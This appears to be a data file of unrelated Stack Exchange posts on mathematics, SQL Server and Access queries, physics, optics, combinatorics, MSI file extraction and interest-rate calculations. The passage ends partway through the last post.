<p>Firstly for a fixed $n$, consider a path around the hypercube which is $$P_n=(0,0,\dots,0)\to(1,0,\dots,0)\to(1,1,0,\dots,0)\to\dots\to(1,1,\dots,1)\to(0,1,\dots,1)\to\dots\to(0,0,\dots,0,1)\to(0,0,\dots,0).$$ Notice that if I give you two points $p,q\in P_n$, then the $L_1$-distance between $p$ and $q$ is exactly the distance between $p$ and $q$ in $P_n$ (the shortest distance, not necessarily following the arrows in $P_n$). Now, suppose we're given a cycle $C_n$ with all edge weights $w_e\in\mathbb{Z}^+$ and $w=\sum_e w_e$ is even. We will do the following: Let $p_1=0$ and $p_i=p_{i-1}+w_{i-1,i}$, so $p_i$ is the weight of the path in $C_n$ from vertex $1$ to vertex $i$ going clockwise. Label the vectors on $P_{w/2}$ starting with $(0,0,\dots,0)$ having label $0$ and going around and map vertex $i$ of $C_n$ to the $p_i$'th vector in $P_{w/2}$. By the previous comment, this is an $L_1$-embedding.</p>

<p>Now, if each $w_e$ is rational, we can find some $M$ for which $Mw_e\in\mathbb{Z}$ for all $e$ and $M\sum_e w_e$ is even, so we can use the previous embedding and then scale.</p>

<p>Now for the irrationals. </p>

<p>For this, we need a compactness argument using the metrics $\mu_S$ from my previous post. Recall that if $V$ is a finite set and $S\subseteq V$, then $\mu_S(x,x)=0$ and $\mu_S(x,y)=\mathbf{1}[|S\cap\{x,y\}|=1]$ if $x\neq y$. It is not difficult to prove that any metric of the form $\mu=\sum_{S\subseteq V}c_S\mu_S$ is $L_1$-embeddable for any $c_S\geq 0$. I claim that, in fact, if $V$ is any finite subset of $L_1^n$, then there are constants $c_S\geq 0$ for which $\Vert x-y\Vert_1=\sum_{S\subseteq V}c_s\mu_S(x,y)$ for every $x,y\in V$. @OferMagen has pointed out that this is known, but I can't find a reference, so I'll provide a proof. First, if $V\subseteq L_1^1$, then write the points $V=\{v_1\leq v_2\leq\dots\leq v_k\}$. Then we have
$$
\Vert x-y\Vert_1=\sum_{r=1}^k\Vert v_{r+1}-v_r\Vert_1\mu_{\{v_1,\dots,v_r\}}(x,y),$$ for any $x,y\in V$. For a general $V\subseteq L_1^n$, we can do this construction in each coordinate direction $e_i$ for $i\in[n]$ since the $L_1$ metric is additive over the coordinates. Thus, if $\mu$ is a metric on a finite set $V$, then $\mu$ is $L_1$-embeddable if and only if $\mu=\sum_{S\subseteq V}c_S\mu_S$ for some constants $c_S\geq 0$.</p>

<p>Now, suppose that some edge-weights are irrational, so suppose $w_e^{(k)}$ are rational numbers with $w_e^{(k)}\to w_e$. Let $\mu^{(k)}$ be the metric induced by the weights $w_e^{(k)}$. By above, we know that each $\mu^{(k)}$ is $L_1$-embeddable, so we can write $\mu^{(k)}=\sum_{S\subseteq V}c_S^{(k)}\mu_S$. By compactness, without loss, we may suppose $c_S^{(k)}\to c_S$. Finally, since $\mu^{(k)}\to\mu$, we must have $\mu=\sum_{S\subseteq V}c_S\mu_S$, so $\mu$ must be $L_1$-embeddable.</p>
",0
"<p>I am modelling a chauffeur-like system, where for each <em>driver</em> that registers in the platform, he/she can either be a ""solo"" <em>driver</em> or belong to an already associated <em>company</em>.</p>

<p>Independently of the type of <em>driver</em>, the following information is registered:</p>

<ul>
<li><em>Driver ID</em> (Primary Key - I considered using this parameter in order to have the system more ""ordered"")</li>
<li><em>Name</em></li>
<li><em>Email</em> (UNIQUE)</li>
<li><em>Phone Number</em> (UNIQUE)</li>
<li><em>Registration Date</em> (Time Stamp)</li>
</ul>

<p>Now, if it's a ""solo"" <em>driver</em>, the following additional information will also be asked:</p>

<ul>
<li><em>Vehicle type</em> (for example: 'car', 'motorbike', etc.)</li>
<li><em>Plate number</em> (UNIQUE)</li>
<li><em>Fiscal number</em> (UNIQUE)</li>
</ul>

<p>If he/she belongs to an associated <em>company</em>, only the <em>name</em> of the <em>company</em> will be asked (since all the <em>vehicles</em> will be associated to the <em>car company</em>).</p>

<p>The <em>company</em> table will have the following attributes:</p>

<ul>
<li><em>Company ID</em> (Primary Key - I considered using this parameter in order to have the system more ""ordered"")</li>
<li><em>Name</em></li>
<li><em>Address</em></li>
<li><em>Contact</em> (UNIQUE)</li>
<li><em>Email</em> (UNIQUE)</li>
<li><em>IBAN</em> (UNIQUE)</li>
<li><em>Fiscal Number</em> (UNIQUE)</li>
</ul>

<p>Lastly, the <em>vehicle</em> table will have the following attributes:</p>

<ul>
<li><em>Vehicle ID</em> (Primary Key - I considered using this parameter in order to have the system more ""ordered"")</li>
<li><em>Company ID</em> (Foreign Key)</li>
<li><em>Vehicle Type</em></li>
<li><em>Plate Number</em> (UNIQUE)</li>
</ul>

<p>A vehicle cannot exist as a standalone entity, i.e., it must be associated to a driver or to an existing company.</p>

<p>I would like to model this scenario using a relational DB since this info will be coupled with a routing algorithm. I'm having a difficult time finding a ""clean"" solution for this problem (specially considering that we are storing related-entity information, vehicle, in two different tables)... so, what's the best way to model this situation?</p>

<p><strong>Responses to clarification requests</strong></p>

<blockquote>
  <ol>
  <li>In your business domain, is it possible for a <em>solo driver</em> to eventually work for a <em>car company</em>? </li>
  <li>Is it possible for a <em>driver</em> that works for a <em>car company</em> to become a <em>solo driver</em> only? </li>
  <li>Can a <em>driver</em> be working for a <em>car company</em> and, at the same time, be working as well as a <em>solo dirver</em>?</li>
  </ol>
</blockquote>

<p>Regarding questions 1 and 2, those are cases I haven't quite considered, but they seem plausible possibilities, so we can consider that those are possible scenarios. </p>

<p>Regarding question 3, for the moment, let's consider that a <em>person</em> can only be a <em>solo driver</em> or a <em>company driver</em>.</p>
",0
"<p>Unless I'm misunderstanding the purpose of the column, the following code indicates that a change of the structure of the clustered index does not change the ordinal position (<code>stats_column_id</code>)of the column in the <a href=""https://msdn.microsoft.com/en-us/library/ms187340.aspx"">sys.stats_columns</a> DMV. (Tested in AdventureWorks2014, AdventureWorks2008R2)</p>

<pre><code>select i.name, c.name, ic.column_id, ic.index_column_id
from sys.indexes i 
join sys.index_columns ic
    on i.object_id = ic.object_id
    and i.index_id = ic.index_id
join sys.columns c 
    on i.object_id = c.object_id
    and ic.column_id = c.column_id
where i.name = 'PK_BusinessEntityAddress_BusinessEntityID_AddressID_AddressTypeID'
order by ic.key_ordinal;

select sh.name,s.name, c.name, c.column_id, sc.column_id, sc.stats_column_id
from sys.stats s 
join sys.stats_columns sc
    on s.object_id = sc.object_id
    and s.stats_id = sc.stats_id
join sys.columns c 
    on s.object_id = c.object_id
    and sc.column_id = c.column_id
join sys.tables t 
    on s.object_id = t.object_id
join sys.schemas sh
    on t.schema_id = sh.schema_id
where s.name = 'PK_BusinessEntityAddress_BusinessEntityID_AddressID_AddressTypeID'
order by sc.stats_column_id;

dbcc show_statistics('[Person].[BusinessEntityAddress]','PK_BusinessEntityAddress_BusinessEntityID_AddressID_AddressTypeID') with density_vector;

ALTER TABLE [Person].[BusinessEntityAddress] DROP CONSTRAINT [PK_BusinessEntityAddress_BusinessEntityID_AddressID_AddressTypeID]
GO

ALTER TABLE [Person].[BusinessEntityAddress] ADD  CONSTRAINT [PK_BusinessEntityAddress_BusinessEntityID_AddressID_AddressTypeID] PRIMARY KEY CLUSTERED 
(
    AddressID ASC,
    [BusinessEntityID] ASC, 
    [AddressTypeID] ASC
)
GO


select i.name, c.name, ic.column_id, ic.index_column_id
from sys.indexes i 
join sys.index_columns ic
    on i.object_id = ic.object_id
    and i.index_id = ic.index_id
join sys.columns c 
    on i.object_id = c.object_id
    and ic.column_id = c.column_id
where i.name = 'PK_BusinessEntityAddress_BusinessEntityID_AddressID_AddressTypeID'
order by ic.key_ordinal;

select sh.name,s.name, c.name, c.column_id, sc.column_id, sc.stats_column_id
from sys.stats s 
join sys.stats_columns sc
    on s.object_id = sc.object_id
    and s.stats_id = sc.stats_id
join sys.columns c 
    on s.object_id = c.object_id
    and sc.column_id = c.column_id
join sys.tables t 
    on s.object_id = t.object_id
join sys.schemas sh
    on t.schema_id = sh.schema_id
where s.name = 'PK_BusinessEntityAddress_BusinessEntityID_AddressID_AddressTypeID'
order by sc.stats_column_id;

dbcc show_statistics('[Person].[BusinessEntityAddress]','PK_BusinessEntityAddress_BusinessEntityID_AddressID_AddressTypeID') with density_vector;
</code></pre>

<p>However, the density vectors indicate a change in the leading column of the index/statistics object. Is this a fundamental misunderstanding on my part? If so, how would I find the leading column of a statistics object using DMVs?</p>

<p>Tested SQL Server versions: 2008R2, 2014</p>
",0
"<p>If the electromagnetic fields are generated by the charge in 1d, then there is no radiation at all, see SE question <a href=""https://physics.stackexchange.com/questions/32685/can-light-exists-in-21-or-11-spacetime-dimensions"">Can light exists in 2+1 or 1+1 spacetime dimensions?</a>. A one sentence reason is that there is no magnetic field in 1d. </p>

<p>However, if you are simulating a real problem, then the electromagnetic fields should be in 3d. Think about a classical problem, a charged bead confined on a line. Then only the $x$ component of electric field along the line will influence the classical motion, since the vertical component of the Lorentz force will be cancelled by the normal force of the line confining the bead. Nevertheless, it much harder in my point of view for a 1d quantum problem, because it is the gauge potential, rather than the gauge field that enter into our equation. We need to derive our equation gauge in invariant manner first and then choose an appropriate gauge to simplify out problem. </p>

<p>As long as you want to couple external EM fields, they should be known as a priori, because they are <em>external</em> and can't be figured out within this Schodinger equation. </p>

<p>I would tentatively suggest the following procedures, (please kindly point out the mistake I have made)</p>

<ol>
<li><p>Couple the EM fields in 3d way,
\begin{equation}
  H = \frac{1}{2m}( {\bf p} - q{\bf A})^2 + q\phi({\bf x},t) 
\end{equation}</p></li>
<li><p>Expand out the minimal coupling, 
\begin{equation}
({\bf p} - q {\bf A} )^2 = {\bf p}^2 + q^2{\bf A}^2 + i \hbar q \nabla \cdot {\bf A} -q {\bf A} \cdot {\bf p} 
\end{equation}</p></li>
<li><p>Erase the $y$ and $z$ dependence. Set the operators $\hat{p_y}$ and $\hat{p_z}$ to be constants, and in all functions $y = z= 0$(after taking the derivative). The equation you get is now
\begin{equation}
i\hbar \frac{\partial}{\partial t} \psi( x, t ) = \frac{1}{2m}[ -\hbar^2 \partial^2_x  + i\hbar q \nabla \cdot {\bf A} +  i\hbar q A_x \partial_x +  p_y^2 + p_z^2 + q^2 {\bf A}^2  - q(A_y p_y + A_z p_z) +  \phi( x, t ) ] \psi(x, t ) 
\end{equation}
This process could be understood as a result of the confining boundary condition $\psi(x, \pm \epsilon, \pm\epsilon,t ) = 0$. In the small region $y\in[-\epsilon, +\epsilon], z\in [-\epsilon, +\epsilon]$, as long as the wavelength $\lambda \ll \epsilon$, we can approximate the field by their value at $y=z=0$. Consequently, $[p_y, H] = [p_z, H]=0$ and you can solve the equation in momentum space. Without eletromagnetic field, we can set $p_y=p_z = 0$, because the term $p_y^2 + p_z^2$ only shift the energy level by a constant and will not influence the wavefunction. However that term $A_yp_y + A_zp_z$ will. </p></li>
<li><p>Perhaps a suitable gauge choice could further simplify the equation. If $\epsilon$ is large such that the ground stage momentum $p_y$ and $p_z \sim 1/\epsilon$ is much smaller compared with $p_x$, then you can neglect the $A_yp_y + A_zp_z$ term. But that requires a very slow varying field.</p></li>
</ol>
",0
"<p>What you need is to take advantage of <a href=""https://en.wikipedia.org/wiki/Disjoint-set_data_structure"" rel=""nofollow noreferrer"">disjoint set</a>, a very efficient data structure.</p>

<p>Here is the simple algorithm to generate a random graph of <span class=""math-container"">$n$</span> vertices and <span class=""math-container"">$m$</span> component.</p>

<ol>
<li><a href=""https://en.wikipedia.org/wiki/Disjoint-set_data_structure#MakeSet"" rel=""nofollow noreferrer"">MakeSet</a> of size <span class=""math-container"">$n$</span>.</li>
<li>Choose two random vertices that has not been connected by an edge.</li>
<li><a href=""https://en.wikipedia.org/wiki/Disjoint-set_data_structure#Union"" rel=""nofollow noreferrer"">Union</a> these two vertices. That means adding the edge between them. Use an implementation of the union operation that tells you if two different components are unioned. </li>
<li>Stop if the number of components become <span class=""math-container"">$m$</span>. Go back to step 2 otherwise.</li>
</ol>

<p>There are existing implementations of disjoint set in C/C++, Java, Python, or just about every popular language. </p>

<p>You can implement step 2 in various ways.</p>

<ul>
<li><p>You can use rejection sampling. Choose two random vertices. Repeat if the edge between them has been added. </p>

<p>This method is about the simplest to implement. It is efficient when the number of components is greater than a fixed proportion of the number of vertices. It takes little time if the number of vertices is not large.</p></li>
<li>You can also keep track of the degree of each vertex. Choose a vertex whose degree is not <span class=""math-container"">$n-1$</span>. The choose an edge from that vertex.</li>
</ul>

<p>You can vary step 3 as well. Step 3 above is aimed to produce a random graph with given number of components and the ""minimal"" number of edges. </p>

<ul>
<li>One way to get random number of edges is to continue adding some random number of random edges after step 3 as long as no two different components become unioned/connected.</li>
<li>One way to get denser graphs is to not add the edge when it connects two different component with some probability <span class=""math-container"">$p$</span>. The larger <span class=""math-container"">$p$</span> is, the more edges.</li>
</ul>

<p>In the special case of one component (connected graph) and many vertices, you can also generate a random tree using <a href=""https://en.wikipedia.org/wiki/Pr%C3%BCfer_sequence"" rel=""nofollow noreferrer"">Prüfer sequence</a>, followed by adding some random edges.</p>

<p>As you have mentioned, you could also generate <span class=""math-container"">$m$</span> random connected graphs with given numbers of vertices, the joining them together. Each connected graph can be generated using either disjoint set or Prüfer sequence.</p>

<p>Note that for all above variations, the distribution of the generated graphs is probably different from each other. It is your task to choose an implementation whose randomness/biasness is what you want. Or roughly. </p>
",0
"<p>On Stack Overflow, I have tried to consistently vote for some of my friends' answers, since he generally provides good answers to somewhat obscure questions but doesn't get a lot of credit, since they're not terribly popular.  One day I noticed that his reputation dropped a ton; upon further inspection, I noticed that all the votes I'd given him in the past had disappeared.</p>

<p>Since I am a long-time reader of Coding Horror and I know Jeff has weird ideas like ""you can sanitize HTML with regular expressions"", I just assumed that Stack Overflow had randomly lost a ton of data because it's full of bugs ;-).  So I dutifully upvoted everything again, burning several days' worth of votes on this rather than voting for other worthy things, hoping to work around a bug or data migration issue.</p>

<p>After doing this for a couple of weeks in a row, I eventually realized that it must be intentional and did some poking around, and discovered <a href=""http://blog.stackoverflow.com/2008/12/vote-fraud-and-you/"">Vote Fraud and You</a> and <a href=""http://blog.stackoverflow.com/2009/03/more-voting-anomalies"">More Voting Anomalies</a>.</p>

<p>Personally, I don't regard this as ""fraud"" at all.  I'm voting for my colleague's answers because I think they're good answers; I discover them through his list of answers, but I vote for them because they're good.  I'm also not the <em>only</em> one upvoting these answers, either.</p>

<p>I don't think I do anything that is fraudlent.  I don't vote exclusively for my friends.  I legitimately participate in the site: I ask questions and I answer questions; I upvote good stuff and I downvote bad stuff.</p>

<p>So, while I respectfully submit that the administrators of this site and I could agree to disagree that this is legitimate voting behavior, as a legitimate contributor in other respects, I would have at <em>least</em> appreciated an error message telling me that my votes were being denied because I'd voted for this person too many times.  Maybe a nice hint like ""You've voted for so-and-so too many times.  Give somebody else a chance!"", with a link to the main questions page.  If those are the rules, then okay, I'll play by the rules; but this is more like getting a foul in a competitive sport, and instead of a referee calling out a red card or whatever, the scoreboard just changes silently with no word from the announcer, and sometimes the other team leaves without a word.</p>

<p>(PS: please don't quote joel's <a href=""http://www.joelonsoftware.com/articles/NotJustUsability.html"" rel=""nofollow noreferrer"">""Not Just Usability""</a> at me as an answer here.  I am not saying that the site should disclose all information to all users at all times; I can understand that sometimes information should be hidden from attackers.  But a real abuser here would have much more quickly resorted to a fleet of sock-puppets spamming from different IPs, rather than assuming that the system's algorithms were otherwise reasonable and would eventually recognize that my interest / votes were genuine.)</p>
",0
"<p>Of course, it all depends on what you are after, and what you can tolerate.  But you can get an estimate by asking a similar question:  over what range of defocus does the spot size not change appreciably? Or equivalently, what is length of the near field of the focused spot?  </p>

<p>That distance can be estimated (<em>order of magnitude!</em>) in the following way. One picture would be worth more than all these words, but all I have right now are words.  Draw a picture. </p>

<p>Consider the ideal spot size at the position of idea focus (Airy disk).  Imagine a crude model for radiation in the near field:  the rays from the disk extend perpendicularly from the disk, as if casting a shadow of a hole in a screen. The diameter of the spot is roughly $\lambda\displaystyle\frac{f}{D}$.   Note that there are constant factors (1.22, $\pi$, etc) that I'm ignoring because I'm interested only in the order of magnitude </p>

<p>However, we know that the light is diverging in the far field due to the focusing action of the lens, and the angle of divergence is approximately the numerical aperture of the lens, or $D/f$ where $D$ is the diameter of the lens and $f$ is the focal length.  Extend the far-field rays back to the focal plane so that they  diverge from a point at the focal point.   </p>

<p>We are certainly outside the range of validity of the Fraunhoffer approximation when the diverging far field rays cross the near field ""shadow"" rays.  Let $z_0$ be the distance from the focal plane to the plane where the rays cross.  The crossing occurs when $$ z_0\frac{D}{f}= \lambda\frac{f}{D}$$
or $$z_0=\lambda\frac{f^2}{D^2}$$</p>

<p>Careful analyses put constants in this formula.  The ""Airy factor"" of $1.22$ needs to be considered, as does a more careful definition of numerical aperture, and considerations of radius vs. diameter. For example, Born and Wolf has $$z_0=\frac{\lambda}{2\pi}\frac{f^2}{D^2} \,\,\,\,\mbox{[see correction below]}$$</p>

<p>You want your defocus to be much less than $z_0$.</p>

<p><strong>Edit after comment</strong></p>

<p>Born and Wolf does not address your question directly ... at least I'm not aware of it if it does.  It does present a discussion of Fresnel diffraction and the field in the vicinity of a focal spot.  This is in Sec 8.8 of the seventh (expanded) edition.  </p>

<p>When I wrote the answer above I was depending on memory.  I have the book now, and I see that I made an error:  The Born and Wolf expression is in terms of the radius, not the diameter.  The correct Born and Wolf expression is $$ z_0 = \frac{\lambda}{2\pi}\frac{f^2}{a^2}$$ where $a$ is the radius of the aperture.  See formulas (8) and (27) in Sec 8.8.   And stare at Figure 8.41 for a while.</p>

<p>See also the extensive set of papers on the <a href=""http://www.nijboerzernike.nl/_html/biblio.html"" rel=""nofollow"">Extended Nijboer-Zernike</a> approach to the defocus (and aberration) problem.  Especially perhaps section 3. of <a href=""http://www.nijboerzernike.nl/_PDF/JOSA-A-19-858-2002.pdf"" rel=""nofollow"">this one</a>.</p>
",0
"<p>There are a number of ways to describe this problem. I shall name a few.</p>

<p><strong>Submultisets</strong></p>

<p>Let $(M, f)$ be a multiset where $M = {x_1, ... x_k}, |M| = k$ and $f(x_i) = m_i$, i ranging from 0 to k inclusive. Find the number of submultisets $(S,g)$ of $(M,f)$ of size n, $|(S, g)| = n$.</p>

<p><strong>Integer Partitions</strong></p>

<p>Let $n, x_1, ... x_k, m_1, ... m_k \in \mathbb{N}$</p>

<p>Find the number of solutions of the equation:</p>

<p>$x_1 + x_2 + ... x_k = n$ </p>

<p>such that $0 \le x_i \le m_i$, i of course ranging from 0 to k inclusive.</p>

<p><strong>Unordered combinations of size n</strong></p>

<p>Let a collection of objects M have k types of objects, where there are $m_i$ identical objects for each type, i from 0 to k inclusive. How many ways can I pick n elements from M, given the restriction that I cannot pick more than $m_i$ from each type?</p>

<p>Unless I've made a mistake somewhere, each of these problems should be identical. </p>

<p>In the ordinary undergrad combinatorics literature, there is a method for picking the number of ways to solve this, without the $m_i$ restrictions I mentioned (or at least $m_i \ge n$. That is call the multiset coefficient. There is also the number of ways of ordering all of the elements of M, provided you use all of them. That is called the multinomial coefficient. This, of course, uses only n elements from M, and does not include ordering.</p>

<p>The only solution I've come across, given the 5 measly hours I've researched the problem, was in Combinatorics and Graph Theory by Harris et. al, which mentions <a href=""http://books.google.com/books?id=C-0y7LI2FFMC&amp;printsec=frontcover&amp;dq=harris+combinatorics&amp;hl=en&amp;ei=6nCPTOGyLcGB8gazx_WhDQ&amp;sa=X&amp;oi=book_result&amp;ct=result&amp;resnum=1&amp;ved=0CCUQ6AEwAA#v=onepage&amp;q=almaalabama&amp;f=false"" rel=""nofollow"">a crude method</a> for counting the number of strings of length 4 of a given set of letters ""Alma, Alabama"". They enumerate 4 different patterns by hand, and use well known equations on those patterns. It works when n and k are small, but is inefficient otherwise.</p>

<p><strong>Update</strong></p>

<p>Sorry, I should have made my question a bit more explicit. I'm looking for an efficient method to do it by hand. The recurrence equations are helpful, but it's not quite what I was looking for.</p>

<p>I don't think there is a simple equation that provides the answers. <em>A recurrence equation is likely to catch all of the cases, but may not be efficient for computing by hand. I don't think there is an efficient way to do this, if k is large and n is small. Or is there?</em></p>

<p><strong>Update 2</strong></p>

<p>Forgive me for bringing up the concept of a multiset. I thought it was in the standard literature. The size of a multiset $|(M, f)|$ is just the summation of the multiplicities $|(M, f)| = \sum_{i} f(x_i)$. It's not the same as the size of the support $|M|$. They are only equal when $f(x_i) = 1$ for all of the elements, just a regular set.</p>
",0
"<p>Start planning to upgrade to SQL Server 2017 as backup operation has been made faster in SQL Server 2017. <a href=""https://blogs.msdn.microsoft.com/sql_server_team/how-we-made-backups-faster-with-sql-server-2017/"" rel=""nofollow noreferrer"">How Do We Made Backups Faster With SQL Server 2017</a> </p>

<blockquote>
  <p>Beyond the above, is there anything that would be benificial to implement. Also whilst setting the values for BLOCKSIZE, MAXTRANSFERSIZE &amp; BUFFERCOUNT, are there any considerations I should take/how do I go about defining the correct values?</p>
</blockquote>

<p>For SQL Server 2014 I believe you already know most of the things, I would help you in deciding how to choose appropriate value for <code>BLOCKSIZE, MAXTRANSFERSIZE &amp; BUFFERCOUNT</code>. Here trace flags can be used to dump additional information into errorlog. For example</p>

<pre><code>dbcc traceon(3605, 3004, 3014, 3213, -1)
go
backup database [AdventureWorks2012] to
disk='D:\Backup Parallelism\Adventureworks.Bak'
</code></pre>

<p>This command will force SQL Server to write additonal parameters into errorlog about internal backup operations.</p>

<pre><code>Memory limit: 249MB
BufferCount:                7
Sets Of Buffers:            1
MaxTransferSize:            1024 KB
Min MaxTransferSize:        64 KB
Total buffer space:         7 MB
Tabular data device count:  1
Fulltext data device count: 0
Filestream device count:    0
TXF device count:           0
Filesystem i/o alignment:   512
Media Buffer count:            7
Media Buffer size:          1024KB
</code></pre>

<p>Now if you see for the simple backup the SQL Server internally chooses <code>7 buffer buckets</code> and and <code>maxtransfer size of 1 MB</code>. You can perform similar test on UAT and can play around with above 2 values. Please note these parameters are selected considering various resources available and SQL Server takes best decision to make sure the backup runs faster.  Make sure not to make the values too large or you will end up with OOM error.</p>

<p>Choosing optimum number of backup files is also important. Brent Ozar in <a href=""https://www.brentozar.com/archive/2014/01/improving-the-performance-of-backups/"" rel=""nofollow noreferrer"">This Blog</a> did some test on backup speed with single to multiple files, this may be helpful to you.</p>

<p>Finally some good readings about SQl Server backup and restore operation from MSDN blogs.</p>

<ul>
<li><a href=""https://blogs.msdn.microsoft.com/psssql/2008/02/06/how-it-works-how-does-sql-server-backup-and-restore-select-transfer-sizes/"" rel=""nofollow noreferrer"">How It Works: How does SQL Server Backup and Restore select transfer sizes</a></li>
<li><a href=""https://blogs.msdn.microsoft.com/psssql/2008/01/28/how-it-works-sql-server-backup-buffer-exchange-a-vdi-focus/"" rel=""nofollow noreferrer"">How It Works: SQL Server Backup Buffer Exchange (a VDI Focus)</a></li>
</ul>

<p>PS: The trace flags are undocumented so please use it ONLY in UAT environment. The same is mentioned in the MSDN links I have shared.</p>
",0
"<p>I am always getting MSI (or setup EXEs which are basically MSI) files, and half the time they really do not need to be a setup.</p>

<p>Microsoft is probably one of the biggest sources - almost every time I want to download a little source code sample, it has a MSI which if you install, only usually has three files.</p>

<p>I would rather not do an install and add it to the add/remove programs and who knows what else (although I am sure it wouldn't be that bad) for the sake of three files!</p>

<p>For this reason, I always use the following command:</p>

<pre><code>MSIEXEC /a &lt;filename.msi&gt; /qb TARGETDIR=&lt;directory name&gt;
</code></pre>

<p>Now, this works fine and I have never had problems... However, I was just browsing some articles on Technet and found the following resource about <a href=""http://msdn.microsoft.com/en-us/library/aa367546(v=vs.85).aspx"" rel=""nofollow noreferrer"">administration installs</a>.</p>

<p>Apparently, MSI files can have two sequences: The <a href=""http://msdn.microsoft.com/en-us/library/aa367544(v=vs.85).aspx"" rel=""nofollow noreferrer""><code>AdminUISequence Table</code></a> and the <a href=""http://msdn.microsoft.com/en-us/library/aa367540(v=vs.85).aspx"" rel=""nofollow noreferrer""><code>AdminExecuteSequence Table</code></a>.</p>

<p>I am not so worried about the <code>AdminUISequence Table</code> as it states that ""The installer skips the actions in this table if the user interface level is set to basic UI or no UI"", and this is what the <code>/qb</code> switch I use does.</p>

<p>However, there is nothing similar written against <code>AdminExecuteSequence Table</code>.</p>

<p>I realise that many people who write MSI files simply do it for a single end user and probably do not even touch the admin install options, however, is it possible for them to set items that can affect the system and if so, is there a fail proof way of extracting?</p>

<p>I do already use <a href=""http://www.7-zip.org"" rel=""nofollow noreferrer"">7-zip</a>, however despite it being on the ""supported"" page, MSI support is lacking... well... completely sucks. It looses the file names and is generally useless. They have a <a href=""https://sourceforge.net/tracker/index.php?func=detail&amp;aid=1778273&amp;group_id=14481&amp;atid=114481"" rel=""nofollow noreferrer"">bug which was closed</a> with no reason/resolution over three years ago, and I <a href=""https://sourceforge.net/projects/sevenzip/forums/forum/45797/topic/4386534"" rel=""nofollow noreferrer"">opened a forum post</a> and haven't had a reply.</p>

<p>I would not really want to install any additional programs if I could help it and just want peoples opinions on this.</p>

<p>Thanks.</p>

<p>edit - Should also say, I run with UAC on, and I have never ever had a elevation prompt whilst performing the MSIEXEC operation, so I am guessing I have never had a system wide change, however, I am still curious as to if it is possible... As if changes (even just to the user) are possible I would do this locally/in a VM and never on a server or place of importance!</p>
",0
"<p>Is there another way to write the following poorly performing in Access (Jet) SQL?</p>

<pre><code>SELECT *
FROM
  Det left join 
  (select * from Inv inner join Dep on Inv.SN=Dep.SN) as mass ON
    (Det.RecSN = mass.SelfID) and (Det.DDTime between mass.Start and mass.End)
</code></pre>

<p>eliminating the sub-select and doing a direct join does not work, giving a <code>JOIN expression not supported</code> Error in the following snippet</p>

<pre><code>SELECT *
FROM
  Det left join 
  (Inv inner join Dep on Inv.SN=Dep.SN) ON
    (Det.RecSN = Inv.SelfID) and (Det.DDTime between Dep.Start and Dep.End)
</code></pre>

<p>The following produces a result, but suppresses Det records that don't match up to one or the other of the inner tables</p>

<pre><code>SELECT *
FROM
  Det inner join 
  (Inv inner join Dep on Inv.SN=Dep.SN) ON
    (Det.RecSN = Inv.SelfID) and (Det.DDTime between Dep.Start and Dep.End)
</code></pre>

<p>adding another set of parentheses doesn't help other than helping Access highlight the join clause that's problematic</p>

<pre><code>SELECT *
FROM
  Det left join 
  (Inv inner join Dep on Inv.SN=Dep.SN) ON
    ((Det.RecSN = Inv.SelfID) and (Det.DDTime between Dep.Start and Dep.End))
</code></pre>

<p>dropping the <code>between</code> clause to a <code>where</code> condition results in no <code>left join</code> characteristics (DDTime isn't between NULL and NULL) and can lead to too many entries being held in memory while other joins are being performed to this whole mess, and can make it more logically difficult to add other where conditionals.</p>

<pre><code>SELECT *
FROM
  Det left join 
  (Inv inner join Dep on Inv.SN=Dep.SN) ON
    Det.RecSN = Inv.SelfID 
WHERE
  Det.DDTime between Dep.Start and Dep.End
</code></pre>

<p>Adding a clause to make <code>left join</code> behavior re-emerge (but only for the portion in the ON clause) makes the world slow to a crawl, I think because Access doesn't know how to handle OR clauses without essentially running a union all in the background for each of the sides of the OR clause with the rest of the query.</p>

<pre><code>SELECT *
FROM
  Det left join 
  (Inv inner join Dep on Inv.SN=Dep.SN) ON
    Det.RecSN = Inv.SelfID 
WHERE
  Det.DDTime between Dep.Start and Dep.End
  OR Dep.Start is NULL
</code></pre>

<p>My current work-around is to use the inner join method, then have another query that queries this one (""qCombo"") and compares against the Det table for entries in Det, but not in qCombo using either a <code>left join</code> or <code>where not exists</code>. But this solution is just as inefficient (if not more so) than the sub-select method at top.</p>

<pre><code>SELECT 'qCombo' as QueryName, *
FROM
  Det inner join 
  (Inv inner join Dep on Inv.SN=Dep.SN) ON
    (Det.RecSN = Inv.SelfID) and (Det.DDTime between Dep.Start and Dep.End)

Select Det.*
FROM
  Det LEFT JOIN
  qCombo ON
    (Det.DDTime=qCombo.DDTime) and
    (Det.OtherFieldsInUniqueIdx=qCombo.OtherFieldsInUniqueIdx)
WHERE
  qCombo.QueryName IS NULL
</code></pre>

<p>Other possibilities?</p>
",0
"<p>The <strong>effective</strong> rate of interest is the amount of money that one unit invested
at the beginning of a period will earn during the period, with interest being
paid at the end of the period; when we speak of the effective rate of interest we mean <em>interest is paid once per measurement period</em>.</p>

<p>An interest rate is called <strong>nominal</strong> if <em>the frequency of compounding (e.g. a month) is not identical to the basic time unit (normally a year): interest is paid
more than once per measurement period</em>.</p>

<p>When interest is paid (i.e., reinvested) more frequently than once per period,
we say it is <strong>payable</strong> (<em>convertible</em>, <em>compounded</em>) each fraction of a period,
and this fractional period is called the interest conversion period.
A nominal rate of interest $i^{(m)}$ payable $m$ times per period, where $m$ is a
positive integer, represents $m$ times the effective rate of compound interest
used for each of the $m$-th of a period. In this case, $\frac{i^{(m)}}{m}$ is the effective rate of interest for each $m$-th of a period.</p>

<p>Thus, for a nominal rate of $i^{(12)}=12\%$ compounded monthly, the effective rate of interest per month is $\frac{i^{(12)}}{12}1\%$ since there are twelve months in a year.</p>

<p>Two rates are said to be <strong>equivalent</strong> if, for the same initial investment and over the
same time interval (one full year, for example), the final value of the investment,
calculated with the two interest rates, is equal.</p>

<p>If $j_q=\frac{i^{(4)}}{4}$ denotes the effective rate of interest per quarter <em>equivalent</em> to the effective rate of interest per month $j_{m}=\frac{i^{(12)}}{12}$ then we can write
$$ \left(1 +\frac{i^{(4)}}{4}\right)^4 =\left(1 +\frac{i^{(12)}}{12}\right)^{12}$$
since each side represents the accumulated value of a principal of $1$ invested
for one year; or equivalently $$ \left(1 +j_q\right) =\left(1 +j_{m}\right)^3$$
since each side represents the accumulated value of a principal of $1$ invested
for one quarter (3 months).</p>

<blockquote>
  <p>So in your case</p>
  
  <ul>
  <li>$i^{(12)}=12\%$ is the nominal interest rate compounded monthly;</li>
  <li>$j_m=\frac{i^{(12)}}{12}=1\%$ is the monthly effective rate of interest:</li>
